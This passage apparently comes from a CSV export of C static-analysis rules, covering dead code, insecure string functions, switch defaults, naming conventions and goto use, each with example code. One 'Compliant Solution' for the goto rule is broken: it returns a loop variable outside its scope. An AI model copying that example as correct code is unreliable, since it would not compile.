  <li> When an increment or decrement operator is used, ex: <code>*p++ == *p++</code> </li>
  <li> Bitwise operators <code>|, &amp;, ^</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=c%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>",c:S1764,c,C,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  do_z();
}
if ( a != a ) { // always false
  do_y();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  do_x();
}
if (a == b || a == b ) { // if the first one is true, the second one is too
  do_w();
}

if (5 / 5) { // always 1
  do_v();
}
if (5 - 5) { // always 0
  do_u();
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> The expression <code>1 &lt;&lt; 1</code> </li>
  <li> When an increment or decrement operator is used, ex: <code>*p++ == *p++</code> </li>
  <li> Bitwise operators <code>|, &amp;, ^</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> {rule:c:S1656} - Implements a check on <code>=</code>. </li>
</ul>",Identical expressions should not be used on both sides of a binary operator,[],MAJOR,['cert'],BUG
2014-06-30T14:50:25+0200,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>) and <code>throw</code> expressions move control
flow out of the current code block. So any unlabelled statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;       // Noncompliant
  i++;             // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",c:S1763,c,C,"<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>) and <code>throw</code> expressions move control
flow out of the current code block. So any unlabelled statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;       // Noncompliant
  i++;             // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int fun(int a) {
  int i = 10;
  return i + a;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/561.html"">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Jump statements should not be followed by dead code,[],MAJOR,"['cert', 'cwe', 'misra', 'unused']",BUG
2013-09-16T11:41:23+0200,"<p>When using legacy C functions such as <code>strcpy</code>, it's up to the developer to make sure the size of the buffer to be written to is large
enough to avoid buffer overruns. If this is not done properly, it can result in a buffer overflow, causing the program to crash at a minimum. At
worst, a carefully crafted overflow can cause malicious code to be executed.</p>
<p>In such cases, it's better to use an alternate, secure, function, such as <code>strlcpy()</code>, <code>strlcat()</code> and
<code>snprintf()</code>, which allows you to define the maximum number of characters to be written to the buffer. However, since
<code>strlcpy()</code> and <code>strlcat()</code> are part of the BSD library, they might not be available, in which case <code>strncpy()</code> and
<code>strncat()</code> should be used instead, but be aware that they don't guarantee the string will be null-terminated.</p>
<p>This rule logs an issue when encountering the following insecure functions: <code>strcpy()</code>, <code>strcat()</code> and
<code>sprintf()</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
sprintf(str, ""%s"", message);   // Noncompliant
strcpy(str, message); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), ""%s"", message);
strlcpy(str, message, sizeof(str));

strncpy(str, message, sizeof(str) -1); // Leave room for null
str[sizeof(str) - 1] = '\0'; // Make sure the string is null-terminated
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QwY"">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",c:S1081,c,C,"<p>When using legacy C functions such as <code>strcpy</code>, it's up to the developer to make sure the size of the buffer to be written to is large
enough to avoid buffer overruns. If this is not done properly, it can result in a buffer overflow, causing the program to crash at a minimum. At
worst, a carefully crafted overflow can cause malicious code to be executed.</p>
<p>In such cases, it's better to use an alternate, secure, function, such as <code>strlcpy()</code>, <code>strlcat()</code> and
<code>snprintf()</code>, which allows you to define the maximum number of characters to be written to the buffer. However, since
<code>strlcpy()</code> and <code>strlcat()</code> are part of the BSD library, they might not be available, in which case <code>strncpy()</code> and
<code>strncat()</code> should be used instead, but be aware that they don't guarantee the string will be null-terminated.</p>
<p>This rule logs an issue when encountering the following insecure functions: <code>strcpy()</code>, <code>strcat()</code> and
<code>sprintf()</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
sprintf(str, ""%s"", message);   // Noncompliant
strcpy(str, message); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), ""%s"", message);
strlcpy(str, message, sizeof(str));

strncpy(str, message, sizeof(str) -1); // Leave room for null
str[sizeof(str) - 1] = '\0'; // Make sure the string is null-terminated
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QwY"">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>","Insecure functions ""strcpy"", ""strcat"" and ""sprintf"" should not be used",[],CRITICAL,"['cert', 'cwe', 'owasp-a9', 'sans-top25-risky']",VULNERABILITY
2017-07-28T12:37:58+0200,"<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>",c:S3973,c,C,"<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>",A conditionally executed single line should be denoted by indentation,[],CRITICAL,"['confusing', 'suspicious']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken. When the <code>switch</code> covers all current values of an <code>enum</code> - and especially when it
doesn't - a <code>default</code> case should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) { // Noncompliant - default clause is missing
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    doDefault();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>
<h3>See also</h3>
<ul>
  <li> <a href='/coding_rules#rule_key=c%3AS3562'>S3562</a> </li>
</ul>",c:SwitchWithoutDefault,c,C,"<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken. When the <code>switch</code> covers all current values of an <code>enum</code> - and especially when it
doesn't - a <code>default</code> case should still be used because there is no guarantee that the <code>enum</code> won't be extended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) { // Noncompliant - default clause is missing
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    doDefault();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>
<h3>See also</h3>
<ul>
  <li> {rule:c:S3562} </li>
</ul>","""switch"" statements should have ""default"" clauses",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  error();
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",c:ElseIfWithoutElse,c,C,"<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  error();
}
</pre>
<h2>Exceptions</h2>
<p>When all branches of an <code>if</code>-<code>else if</code> end with <code>return</code>, <code>break</code> or <code>throw</code>, the code that
comes after the <code>if</code> implicitly behaves as if it was in an <code>else</code> clause. This rule will therefore ignore that case.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""if ... else if"" constructs should end with ""else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2018-02-14T07:15:15+0100,"<p>Control characters aren't visible to maintainers, so they should be escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char* foo = ""A	B"";  // Noncompliant, contains a tabulation
</pre>
<h2>Compliant Solution</h2>
<pre>
const char* foo = ""A\tB"";  // Compliant, use escaped value
</pre>
<h2>Exceptions</h2>
<p>Raw string literals has no escape character mechanism.</p>",c:S2479,c,C,"<p>Control characters aren't visible to maintainers, so they should be escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char* foo = ""A	B"";  // Noncompliant, contains a tabulation
</pre>
<h2>Compliant Solution</h2>
<pre>
const char* foo = ""A\tB"";  // Compliant, use escaped value
</pre>
<h2>Exceptions</h2>
<p>Raw string literals has no escape character mechanism.</p>",Control characters should not be used in literals,[],CRITICAL,['pitfall'],CODE_SMELL
2015-02-03T08:39:44+0100,"<p>Line-splicing occurs when the \ character is immediately followed by a new-line character. If the source line containing a <code>//</code> comment
ends with a '\', the next line becomes part of the comment. This may result in unintentional removal of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( void )
{
  int x = 0; // comment \
  if (x)
  {
    ++x; /* This is always executed */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 3.2 - Line-splicing shall not be used in // comments </li>
</ul>",c:S2323,c,C,"<p>Line-splicing occurs when the \ character is immediately followed by a new-line character. If the source line containing a <code>//</code> comment
ends with a '\', the next line becomes part of the comment. This may result in unintentional removal of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( void )
{
  int x = 0; // comment \
  if (x)
  {
    ++x; /* This is always executed */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 3.2 - Line-splicing shall not be used in // comments </li>
</ul>","Line-splicing should not be used in ""//"" comments",[],CRITICAL,['misra'],BUG
2015-04-11T13:39:23+0200,"<p>Just as comparing apples and oranges is seen as a classic folly, comparing values from different enumerations against each other is nonsensical.
True, at root <code>enum</code>s are simply named numbers, and it's certainly valid to compare numbers. But an added layer of meaning is created by an
<code>enum</code>, one that goes beyond simple numerical values.</p>
<p>Ignoring that extra layer of meaning is at best a trap for maintainers, who are likely to be hopelessly confused by the code. At worst, it is a
bug, which will lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum apple {BRAEBURN, FUJI, GRANNY_SMITH, RED_DELICIOUS};
enum orange {BLOOD, NAVEL, BITTER, BERGAMOT, MANDARIN};

bool fun(apple v1, orange v2) {
  return v1 != v2;  // Noncompliant
}
</pre>",c:S2753,c,C,"<p>Just as comparing apples and oranges is seen as a classic folly, comparing values from different enumerations against each other is nonsensical.
True, at root <code>enum</code>s are simply named numbers, and it's certainly valid to compare numbers. But an added layer of meaning is created by an
<code>enum</code>, one that goes beyond simple numerical values.</p>
<p>Ignoring that extra layer of meaning is at best a trap for maintainers, who are likely to be hopelessly confused by the code. At worst, it is a
bug, which will lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum apple {BRAEBURN, FUJI, GRANNY_SMITH, RED_DELICIOUS};
enum orange {BLOOD, NAVEL, BITTER, BERGAMOT, MANDARIN};

bool fun(apple v1, orange v2) {
  return v1 != v2;  // Noncompliant
}
</pre>","Values of different ""enum"" types should not be compared",[],MAJOR,[],BUG
2018-12-19T08:44:16+0100,"<p>The function <code>memcmp</code> can only be used for objects of trivially copyable types. This includes scalar types, arrays, and trivially
copyable classes. </p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>Additionally, if the type contains padding, some of its bits might be non-representative, and a strict comparison of raw memory contents might lead
to the mistaken belief that two identical objects are actually different.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape { // Trivially copyable, but will contain padding after the bool on most architectures
public:
  bool visible;
  int x;
  int y;
};

bool isSame(Shape *s1, Shape *s2)
{
    return memcmp(s1, s2, sizeof Shape) == 0; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  bool visible;
  int x;
  int y;
};

bool operator==(Shape const &amp;s1, Shape const &amp;s2) {
  return s1.visible == s2.visible &amp;&amp; s1.x == s2.x &amp;&amp; s1.y == s2.y;
}

bool isSame(Shape *s1, Shape *s2)
{
    return (*s1) == (*s2);
}
</pre>",c:S5000,c,C,"<p>The function <code>memcmp</code> can only be used for objects of trivially copyable types. This includes scalar types, arrays, and trivially
copyable classes. </p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>Additionally, if the type contains padding, some of its bits might be non-representative, and a strict comparison of raw memory contents might lead
to the mistaken belief that two identical objects are actually different.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape { // Trivially copyable, but will contain padding after the bool on most architectures
public:
  bool visible;
  int x;
  int y;
};

bool isSame(Shape *s1, Shape *s2)
{
    return memcmp(s1, s2, sizeof Shape) == 0; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  bool visible;
  int x;
  int y;
};

bool operator==(Shape const &amp;s1, Shape const &amp;s2) {
  return s1.visible == s2.visible &amp;&amp; s1.x == s2.x &amp;&amp; s1.y == s2.y;
}

bool isSame(Shape *s1, Shape *s2)
{
    return (*s1) == (*s2);
}
</pre>","""memcmp"" should only be called with pointers to trivially copyable types with no padding",[],BLOCKER,['unpredictable'],BUG
2015-11-05T15:08:09+0100,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all <code>enum</code> names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
enum someEnumeration { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
enum SomeEnumeration {
};
</pre>",c:S2342,c,C,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all <code>enum</code> names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
enum someEnumeration { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
enum SomeEnumeration {
};
</pre>",Enumeration names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the enumeration names against', 'defaultValue': '[A-Z][a-zA-Z0-9]+', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2015-11-05T15:08:10+0100,"<p>Shared coding conventions allow teams to collaborate effectively. This rule checks that labels match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][A-Z0-9_]+</code>:</p>
<pre>
exit:  // Noncompliant
  doCleanup();
</pre>
<h2>Compliant Solution</h2>
<pre>
EXIT:  // Compliant
  doCleanup();
</pre>",c:S3222,c,C,"<p>Shared coding conventions allow teams to collaborate effectively. This rule checks that labels match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][A-Z0-9_]+</code>:</p>
<pre>
exit:  // Noncompliant
  doCleanup();
</pre>
<h2>Compliant Solution</h2>
<pre>
EXIT:  // Compliant
  doCleanup();
</pre>",Label names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the label names against.', 'defaultValue': '[A-Z][A-Z0-9_]+', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-08-07T09:36:27+0200,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>union</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
union my_union {
    int one;
    int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
union MyUnion {
    int one;
    int two;
};
</pre>",c:S1878,c,C,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>union</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
union my_union {
    int one;
    int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
union MyUnion {
    int one;
    int two;
};
</pre>","""union"" names should comply with a naming convention","[{'key': 'format', 'htmlDesc': 'POSIX regular expression union names should match.', 'defaultValue': '[A-Z][a-zA-Z0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>struct</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
struct myStruct {
  int one;
  int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct MyStruct {
  int one;
  int two;
};
</pre>",c:S1642,c,C,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>struct</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
struct myStruct {
  int one;
  int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct MyStruct {
  int one;
  int two;
};
</pre>","""struct"" names should comply with a naming convention","[{'key': 'format', 'htmlDesc': 'POSIX regular expression struct names should match.', 'defaultValue': '[A-Z][a-zA-Z0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo()
{
  int x;
  if (x == 42)
  {                     /* Noncompliant */
    /* do nothing */
  }
  else
  {
    printf(""x != 42"");
  }
}

void bar()
{                       /* Compliant - functions are not nested blocks */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo()
{
  int x;
  if (x != 42)
  {                     /* Compliant */
    printf(""x != 42"");
  }
}

/* ... */
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",c:EmptyCompoundStatement,c,C,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo()
{
  int x;
  if (x == 42)
  {                     /* Noncompliant */
    /* do nothing */
  }
  else
  {
    printf(""x != 42"");
  }
}

void bar()
{                       /* Compliant - functions are not nested blocks */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo()
{
  int x;
  if (x != 42)
  {                     /* Compliant */
    printf(""x != 42"");
  }
}

/* ... */
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-c:InsufficientBranchCoverage,c,C,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Unconstrained use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse. For C++, it can also lead to
the program exhibiting unspecified behavior.</p>
<p>However, in many cases a total ban on <code>goto</code> requires the introduction of flags to ensure correct control flow, and it is possible that
these flags may themselves be less transparent than the <code>goto</code> they replace.</p>
<p>Therefore, the restricted use of <code>goto</code> is allowed where that use will not lead to semantics contrary to developer expectations. ""Back""
jumps are prohibited, since they can be used to create iterations without using the well-defined iteration statements supplied by the core
language.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int f() {
  int j = 0;
L1:
  ++j;
  if (10 == j) {
    goto L2;         // forward jump ignored
  }
  // ...
  goto L1;           // Noncompliant
L2:
  return ++j;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f() {
  for (int j = 0; j &lt; 11; j++) {
    // ...
  }
  return ++j;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-2 - The goto statement shall jump to a label declared later in the same function body </li>
  <li> MISRA C:2012, 15.2 - The goto statement shall jump to a label declared later in the same function </li>
</ul>",c:BackJumpWithGoto,c,C,"<p>Unconstrained use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse. For C++, it can also lead to
the program exhibiting unspecified behavior.</p>
<p>However, in many cases a total ban on <code>goto</code> requires the introduction of flags to ensure correct control flow, and it is possible that
these flags may themselves be less transparent than the <code>goto</code> they replace.</p>
<p>Therefore, the restricted use of <code>goto</code> is allowed where that use will not lead to semantics contrary to developer expectations. ""Back""
jumps are prohibited, since they can be used to create iterations without using the well-defined iteration statements supplied by the core
language.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int f() {
  int j = 0;
L1:
  ++j;
  if (10 == j) {
    goto L2;         // forward jump ignored
  }
  // ...
  goto L1;           // Noncompliant
L2:
  return ++j;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f() {
  for (int j = 0; j &lt; 11; j++) {
    // ...
  }
  return ++j;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-2 - The goto statement shall jump to a label declared later in the same function body </li>
  <li> MISRA C:2012, 15.2 - The goto statement shall jump to a label declared later in the same function </li>
</ul>","""goto"" should jump to labels declared later in the same function",[],BLOCKER,"['misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>This excludes the use of <code>//</code> C99 style comments and C++ style comments, since these are not permitted in C90. Many compilers support
